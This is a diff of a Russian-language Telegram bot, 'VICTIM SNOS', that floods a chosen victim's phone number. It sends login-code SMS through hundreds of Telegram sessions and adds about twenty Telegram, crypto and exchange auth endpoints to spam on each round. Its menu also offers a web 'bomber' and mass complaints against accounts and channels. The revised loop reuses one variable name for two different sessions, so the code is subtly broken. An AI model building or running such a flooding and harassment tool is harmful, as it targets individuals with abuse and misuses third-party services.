@@ -29,9 +29,9 @@ API_HASH = "b18441a1ff607e10a989891a5462e627"
 ADMIN_ID = 7736817432
 ALLOWED_USERS_FILE = "allowed_users.json"
 
-SESSIONS_PER_USER = 500  # 500 сессий на пользователя
+SESSIONS_PER_USER = 300
 SESSION_DELAY = 60
-SMS_PER_ROUND = 10  # Увеличено до 10 за раунд
+SMS_PER_ROUND = 10
 ROUND_DELAY = 10
 BOMBER_DELAY = 3
 
@@ -52,6 +52,31 @@ USER_AGENTS = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
     'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
     'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
+]
+
+TELEGRAM_AUTH_SITES = [
+    {"url": "https://my.telegram.org/auth/send_password", "method": "POST", "phone_field": "phone", "name": "MyTelegram"},
+    {"url": "https://web.telegram.org/k/api/auth/sendCode", "method": "POST", "phone_field": "phone", "name": "WebTelegram"},
+    {"url": "https://api.fragment.com/auth", "method": "POST", "phone_field": "phone", "name": "Fragment"},
+    {"url": "https://api.getgems.io/auth/telegram", "method": "POST", "phone_field": "phone", "name": "GetGems"},
+    {"url": "https://api.tonkeeper.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Tonkeeper"},
+    {"url": "https://api.tonhub.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Tonhub"},
+    {"url": "https://api.hamsterkombat.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "HamsterKombat"},
+    {"url": "https://api.notcoin.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Notcoin"},
+    {"url": "https://api.tapswap.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "TapSwap"},
+    {"url": "https://api.blum.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Blum"},
+    {"url": "https://api.yescoin.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Yescoin"},
+    {"url": "https://api.cats.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Cats"},
+    {"url": "https://api.pixelverse.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Pixelverse"},
+    {"url": "https://api.muskempire.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "MuskEmpire"},
+    {"url": "https://api.bybit.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Bybit"},
+    {"url": "https://api.htx.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "HTX"},
+    {"url": "https://api.gate.io/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Gate"},
+    {"url": "https://api.kucoin.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "KuCoin"},
+    {"url": "https://api.mexc.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "MEXC"},
+    {"url": "https://api.bitget.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Bitget"},
+    {"url": "https://api.tgstat.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "TGStat"},
+    {"url": "https://api.telemetr.io/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Telemetr"},
 ]
 
 BOMBER_WEBSITES = [
@@ -298,24 +323,22 @@ async def create_single_session(session_file: str, idx: int) -> dict:
             system_version="iOS 17.0"
         )
         await client.connect()
-        logger.info(f"Сессия {idx} создана успешно")
+        logger.info(f"Сессия {idx} создана")
         return {"client": client, "in_use": False, "flood_until": 0, "index": idx, "last_used": 0}
     except Exception as e:
-        logger.error(f"Ошибка создания сессии {idx}: {e}")
+        logger.error(f"Ошибка сессии {idx}: {e}")
         return None
 
-async def create_user_sessions(user_id: int, start_from: int = 0) -> tuple:
+async def create_user_sessions(user_id: int) -> tuple:
     session_dir = get_user_session_dir(user_id)
     os.makedirs(session_dir, exist_ok=True)
     
     existing_count = count_user_sessions_files(user_id)
-    logger.info(f"Пользователь {user_id}: найдено {existing_count} существующих сессий")
+    logger.info(f"Пользователь {user_id}: найдено {existing_count} сессий")
     
     if existing_count >= SESSIONS_PER_USER:
-        logger.info(f"Пользователь {user_id}: все {SESSIONS_PER_USER} сессий уже существуют")
         return [], existing_count
     
-    # Загружаем существующие сессии
     sessions = []
     for i in range(existing_count):
         session_file = f"{session_dir}/session_{i}"
@@ -324,12 +347,9 @@ async def create_user_sessions(user_id: int, start_from: int = 0) -> tuple:
             if sess:
                 sessions.append(sess)
     
-    logger.info(f"Пользователь {user_id}: загружено {len(sessions)} существующих сессий")
-    
-    # Создаем недостающие сессии
     need_to_create = SESSIONS_PER_USER - len(sessions)
     if need_to_create > 0:
-        logger.info(f"Пользователь {user_id}: нужно создать еще {need_to_create} сессий")
+        logger.info(f"Пользователь {user_id}: создание {need_to_create} сессий")
         
         batch_size = 10
         for batch_start in range(len(sessions), SESSIONS_PER_USER, batch_size):
@@ -340,10 +360,6 @@ async def create_user_sessions(user_id: int, start_from: int = 0) -> tuple:
                 session_file = f"{session_dir}/session_{i}"
                 if not os.path.exists(f"{session_file}.session"):
                     tasks.append(create_single_session(session_file, i))
-                else:
-                    sess = await create_single_session(session_file, i)
-                    if sess:
-                        sessions.append(sess)
             
             if tasks:
                 results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -351,34 +367,29 @@ async def create_user_sessions(user_id: int, start_from: int = 0) -> tuple:
                     if r and not isinstance(r, Exception):
                         sessions.append(r)
             
-            logger.info(f"Пользователь {user_id}: создано {len(sessions)}/{SESSIONS_PER_USER} сессий")
+            logger.info(f"Пользователь {user_id}: {len(sessions)}/{SESSIONS_PER_USER}")
             await asyncio.sleep(2)
     
     return sessions, len(sessions)
 
 async def ensure_user_sessions(user_id: int):
     if user_id in sessions_creation_lock and sessions_creation_lock[user_id]:
-        logger.info(f"Пользователь {user_id}: сессии уже создаются")
         return
     
     sessions_creation_lock[user_id] = True
     
     try:
         if user_id not in user_sessions:
-            user_sessions[user_id] = {"sessions": [], "ready": False, "task": None, "total": 0}
+            user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
         
         sessions, total = await create_user_sessions(user_id)
         user_sessions[user_id]["sessions"] = sessions
         user_sessions[user_id]["total"] = total
         user_sessions[user_id]["ready"] = True
-        
-        logger.info(f"Пользователь {user_id}: готово {len(sessions)}/{SESSIONS_PER_USER} сессий")
     finally:
         sessions_creation_lock[user_id] = False
 
 async def refresh_user_sessions(user_id: int):
-    logger.info(f"Обновление сессий для пользователя {user_id}...")
-    
     if user_id in user_sessions:
         old_data = user_sessions[user_id]
         for s in old_data.get("sessions", []):
@@ -386,14 +397,12 @@ async def refresh_user_sessions(user_id: int):
                 await s["client"].disconnect()
             except:
                 pass
-        if old_data.get("task") and not old_data["task"].done():
-            old_data["task"].cancel()
     
     session_dir = get_user_session_dir(user_id)
     if os.path.exists(session_dir):
         shutil.rmtree(session_dir)
     
-    user_sessions[user_id] = {"sessions": [], "ready": False, "task": None, "total": 0}
+    user_sessions[user_id] = {"sessions": [], "ready": False, "total": 0}
     await ensure_user_sessions(user_id)
 
 async def get_user_sessions_batch(user_id: int, count: int) -> list:
@@ -449,11 +458,26 @@ async def send_sms_safe(session_data: dict, phone: str) -> dict:
         elif "PHONE_NUMBER_FLOOD" in err:
             session_data["flood_until"] = time.time() + 3600
             return {"success": False, "error": "number_flood"}
-        elif "PHONE_NUMBER_UNOCCUPIED" in err:
-            return {"success": False, "error": "not_registered"}
         return {"success": False, "error": err[:30]}
     except:
         return {"success": False, "error": "unknown"}
+
+async def send_auth_request(session: aiohttp.ClientSession, phone: str, site: dict) -> dict:
+    headers = {
+        'User-Agent': random.choice(USER_AGENTS),
+        'Content-Type': 'application/json',
+        'Accept': 'application/json',
+    }
+    payload = {site["phone_field"]: phone}
+    try:
+        if site["method"] == "POST":
+            async with session.post(site["url"], headers=headers, json=payload, timeout=10, ssl=False) as resp:
+                return {"site": site["name"], "success": True}
+        else:
+            async with session.get(site["url"], headers=headers, params=payload, timeout=10, ssl=False) as resp:
+                return {"site": site["name"], "success": True}
+    except:
+        return {"site": site["name"], "success": False}
 
 async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=None) -> tuple:
     results, ok, err = [], 0, 0
@@ -461,35 +485,40 @@ async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=N
     if not phone.startswith("+"):
         phone = "+" + phone
     
-    for rnd in range(1, rounds + 1):
-        sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
-        if not sessions:
-            logger.warning(f"Раунд {rnd}: нет доступных сессий")
+    connector = aiohttp.TCPConnector(limit=50, force_close=True, ssl=False)
+    
+    async with aiohttp.ClientSession(connector=connector) as sess:
+        for rnd in range(1, rounds + 1):
+            sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
+            
+            tasks = []
+            # SMS через сессии
+            for sess in sessions:
+                tasks.append(send_sms_safe(sess, phone))
+            # Веб-запросы
+            for site in TELEGRAM_AUTH_SITES:
+                tasks.append(send_auth_request(sess, phone, site))
+            
+            batch = await asyncio.gather(*tasks, return_exceptions=True)
+            release_user_sessions(sessions)
+            
+            round_ok, round_err = 0, 0
+            for r in batch:
+                if isinstance(r, dict):
+                    results.append(r)
+                    if r.get("success"):
+                        ok += 1
+                        round_ok += 1
+                    else:
+                        err += 1
+                        round_err += 1
+            
             if progress_callback:
                 await progress_callback(rnd, rounds, ok, err)
-            await asyncio.sleep(5)
-            continue
-        
-        round_ok, round_err = 0, 0
-        for i, sess in enumerate(sessions):
-            result = await send_sms_safe(sess, phone)
-            results.append(result)
-            if result.get("success"):
-                ok += 1
-                round_ok += 1
-            else:
-                err += 1
-                round_err += 1
-            if i < len(sessions) - 1:
-                await asyncio.sleep(3)
-        
-        release_user_sessions(sessions)
-        if progress_callback:
-            await progress_callback(rnd, rounds, ok, err)
-        
-        logger.info(f"Снос раунд {rnd}/{rounds}: отправлено {round_ok}, ошибок {round_err}")
-        if rnd < rounds:
-            await asyncio.sleep(ROUND_DELAY)
+            
+            logger.info(f"Снос раунд {rnd}/{rounds}: OK={round_ok} ERR={round_err}")
+            if rnd < rounds:
+                await asyncio.sleep(ROUND_DELAY)
     
     return results, ok, err
 
@@ -535,7 +564,7 @@ async def bomber_attack(phone: str, rounds: int, progress_callback=None) -> tupl
             if progress_callback:
                 await progress_callback(rnd, rounds, ok, err)
             
-            logger.info(f"Бомбер раунд {rnd}/{rounds}: успешно {round_ok}, ошибок {round_err}")
+            logger.info(f"Бомбер раунд {rnd}/{rounds}: OK={round_ok} ERR={round_err}")
             if rnd < rounds:
                 await asyncio.sleep(BOMBER_DELAY)
     
@@ -594,38 +623,37 @@ def generate_snos_report(phone: str, results: list, ok: int, err: int, user_id: 
         f"Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
         f"Всего сессий: {SESSIONS_PER_USER}",
         f"За раунд SMS: {SMS_PER_ROUND}",
-        f"Задержка сессии: {SESSION_DELAY} сек",
-        f"Успешно SMS: {ok}",
-        f"Ошибок SMS: {err}",
-        "=" * 50
+        f"Сайтов: {len(TELEGRAM_AUTH_SITES)}",
+        f"Успешно: {ok}",
+        f"Ошибок: {err}",
+        "=" * 50,
+        "",
+        "Сайт - Удачно/Неудачно",
+        "-" * 30
     ]
     
-    if err > 0:
-        error_stats = {"flood": 0, "invalid_number": 0, "number_flood": 0, "not_registered": 0, "other": 0}
-        for r in results:
-            if not r.get("success"):
-                if "flood" in r:
-                    error_stats["flood"] += 1
-                elif r.get("error") == "invalid_number":
-                    error_stats["invalid_number"] += 1
-                elif r.get("error") == "number_flood":
-                    error_stats["number_flood"] += 1
-                elif r.get("error") == "not_registered":
-                    error_stats["not_registered"] += 1
-                else:
-                    error_stats["other"] += 1
-        
-        lines.append("\nСтатистика ошибок:")
-        if error_stats["flood"] > 0:
-            lines.append(f"  FloodWait: {error_stats['flood']}")
-        if error_stats["invalid_number"] > 0:
-            lines.append(f"  Неверный номер: {error_stats['invalid_number']}")
-        if error_stats["number_flood"] > 0:
-            lines.append(f"  Номер в бане: {error_stats['number_flood']}")
-        if error_stats["not_registered"] > 0:
-            lines.append(f"  Нет в Telegram: {error_stats['not_registered']}")
-        if error_stats["other"] > 0:
-            lines.append(f"  Другие: {error_stats['other']}")
+    site_stats = {}
+    sms_ok = sms_err = 0
+    
+    for r in results:
+        if r.get('type') == 'SMS' or 'flood' in r or 'error' in r:
+            if r.get('success'):
+                sms_ok += 1
+            else:
+                sms_err += 1
+        else:
+            site = r.get('site', 'Unknown')
+            if site not in site_stats:
+                site_stats[site] = {"ok": 0, "err": 0}
+            if r.get('success'):
+                site_stats[site]["ok"] += 1
+            else:
+                site_stats[site]["err"] += 1
+    
+    lines.append(f"SMS: Удачно ({sms_ok}/{sms_ok+sms_err})")
+    for site, stats in sorted(site_stats.items()):
+        status = "Удачно" if stats["ok"] > 0 else "Неудачно"
+        lines.append(f"{site}: {status} ({stats['ok']}/{stats['ok']+stats['err']})")
     
     return "\n".join(lines)
 
@@ -665,8 +693,8 @@ def generate_bomber_report(phone: str, results: list, ok: int, err: int) -> str:
 # ---------- UI ----------
 def get_main_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="СНОС НОМЕРА (SMS)", callback_data="snos")
-    builder.button(text="БОМБЕР (ВЕБ)", callback_data="bomber")
+    builder.button(text="СНОС НОМЕРА", callback_data="snos")
+    builder.button(text="БОМБЕР", callback_data="bomber")
     builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="comp_acc")
     builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="comp_chan")
     builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
@@ -677,8 +705,8 @@ def get_main_menu():
 
 def get_admin_menu():
     builder = InlineKeyboardBuilder()
-    builder.button(text="СНОС НОМЕРА (SMS)", callback_data="snos")
-    builder.button(text="БОМБЕР (ВЕБ)", callback_data="bomber")
+    builder.button(text="СНОС НОМЕРА", callback_data="snos")
+    builder.button(text="БОМБЕР", callback_data="bomber")
     builder.button(text="ЖАЛОБА НА АККАУНТ", callback_data="comp_acc")
     builder.button(text="ЖАЛОБА НА КАНАЛ", callback_data="comp_chan")
     builder.button(text="ОБНОВИТЬ СЕССИИ", callback_data="refresh_sessions")
@@ -739,18 +767,19 @@ async def start(msg: types.Message):
     
     if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
         asyncio.create_task(ensure_user_sessions(user_id))
-        await msg.answer("Запущено создание 500 сессий. Это займет 5-10 минут...")
+        await msg.answer(f"Запущено создание {SESSIONS_PER_USER} сессий. Это займет 5-10 минут...")
     
     sessions_count = get_user_sessions_count(user_id)
     sessions_ready = is_user_sessions_ready(user_id)
     
     await send_banner(
         msg,
-        f"<b>VICTIM SNOS v9.0</b>\n\n"
+        f"<b>VICTIM SNOS v10.0</b>\n\n"
         f"ID: <code>{user_id}</code>\n"
         f"Сессии: {sessions_count}/{SESSIONS_PER_USER} {'[ГОТОВ]' if sessions_ready else '[ЗАГРУЗКА]'}\n"
         f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
-        f"SMS/раунд: {SMS_PER_ROUND}",
+        f"Сайтов сноса: {len(TELEGRAM_AUTH_SITES)}\n"
+        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}",
         get_main_menu() if user_id != ADMIN_ID else get_admin_menu()
     )
 
@@ -822,9 +851,9 @@ async def refresh_sessions(cb: types.CallbackQuery):
         await cb.answer("Нельзя во время сноса!", show_alert=True)
         return
     
-    await cb.answer("Обновление 500 сессий...")
+    await cb.answer(f"Обновление {SESSIONS_PER_USER} сессий...")
     asyncio.create_task(refresh_user_sessions(user_id))
-    await cb.message.answer("Обновление 500 сессий запущено. Это займет 5-10 минут.")
+    await cb.message.answer(f"Обновление {SESSIONS_PER_USER} сессий запущено. Это займет 5-10 минут.")
 
 @dp.callback_query(F.data == "status")
 async def status(cb: types.CallbackQuery):
@@ -838,8 +867,9 @@ async def status(cb: types.CallbackQuery):
         f"ID: <code>{user_id}</code>\n"
         f"Сессии: {sessions_count}/{SESSIONS_PER_USER} ({'Готовы' if sessions_ready else 'Загрузка'})\n"
         f"Почта: {len(mail_tm.accounts)}/{MAILTM_ACCOUNTS_COUNT}\n"
-        f"SMS/раунд: {SMS_PER_ROUND}\n"
-        f"Задержка: {SESSION_DELAY}с",
+        f"Сайтов сноса: {len(TELEGRAM_AUTH_SITES)}\n"
+        f"Сайтов бомбера: {len(BOMBER_WEBSITES)}\n"
+        f"SMS/раунд: {SMS_PER_ROUND}",
         InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", callback_data="main_menu")]])
     )
 
@@ -879,11 +909,11 @@ async def snos_count(msg: types.Message, state: FSMContext):
     await state.clear()
     
     active_attacks[user_id] = True
-    st = await msg.answer(f"<b>СНОС ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}\nСессий: {SESSIONS_PER_USER}")
+    st = await msg.answer(f"<b>СНОС ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}\nСайтов: {len(TELEGRAM_AUTH_SITES)}")
     
     async def prog(cur, tot, ok, err):
         try:
-            await st.edit_text(f"<b>СНОС</b>\n\nНомер: {phone}\nРаунд: {cur}/{tot}\nSMS: {ok}\nОшибок: {err}")
+            await st.edit_text(f"<b>СНОС</b>\n\nНомер: {phone}\nРаунд: {cur}/{tot}\nУспешно: {ok}\nОшибок: {err}")
         except:
             pass
     
@@ -895,7 +925,7 @@ async def snos_count(msg: types.Message, state: FSMContext):
     with open(fn, 'w', encoding='utf-8') as f:
         f.write(report)
     
-    await msg.answer_document(FSInputFile(fn), caption=f"Снос завершен! SMS: {ok}")
+    await msg.answer_document(FSInputFile(fn), caption=f"Снос завершен! Успешно: {ok}")
     os.remove(fn)
     await st.delete()
     
@@ -942,7 +972,7 @@ async def bomber_count(msg: types.Message, state: FSMContext):
     
     async def prog(cur, tot, ok, err):
         try:
-            await st.edit_text(f"<b>БОМБЕР</b>\n\nНомер: {phone}\nРаунд: {cur}/{tot}\nЗапросов: {ok}\nОшибок: {err}")
+            await st.edit_text(f"<b>БОМБЕР</b>\n\nНомер: {phone}\nРаунд: {cur}/{tot}\nУспешно: {ok}\nОшибок: {err}")
         except:
             pass
     
@@ -1082,7 +1112,7 @@ async def init_mailtm():
 
 async def main():
     load_allowed_users()
-    logger.info(f"VICTIM SNOS v9.0 запуск... Сессий на пользователя: {SESSIONS_PER_USER}")
+    logger.info(f"VICTIM SNOS v10.0 запуск... Сессий: {SESSIONS_PER_USER}, Сайтов сноса: {len(TELEGRAM_AUTH_SITES)}, Бомбер: {len(BOMBER_WEBSITES)}")
     await bot.delete_webhook(drop_pending_updates=True)
     asyncio.create_task(init_mailtm())
     await dp.start_polling(bot)
